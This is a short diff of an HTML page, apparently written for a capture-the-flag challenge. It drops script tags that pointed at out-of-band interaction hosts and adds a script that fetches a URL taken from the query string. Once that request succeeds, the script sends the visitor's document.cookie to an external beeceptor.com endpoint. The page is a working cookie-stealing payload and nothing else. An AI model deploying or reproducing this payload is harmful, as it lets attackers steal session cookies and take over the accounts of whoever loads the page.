@@ -1,9 +1,26 @@
 <html>
-  <head>
-  </head>
-  <body>
-    <script src="https://czh7nnpz1wg00006q5qggxau45yyyyyyb.oast.pro/"></script>
-    <script src="https://ctfseatscaletest123.free.beeceptor.com/"></script>
-    <script src="https://datadome.co/test123"></script>
-  </body>
+<body>
+
+<script>
+       var url = location.search;
+       var split_url = url.split('?');
+       para_str = split_url[1];
+
+       window.onload = function(){
+       var request = new XMLHttpRequest();
+
+       request.onreadystatechange = function() {
+               if (this.readyState == 4 && this.status == 200) {
+                       var oReq = new XMLHttpRequest();
+                       oReq.open("GET", "https://ctfseatscaletest123.free.beeceptor.com/?cookies=" + document.cookie, true);
+                       oReq.send();
+               }
+       };
+
+       request.open('GET', para_str);
+       request.send();
+       }
+</script>
+
+</body>
 </html>
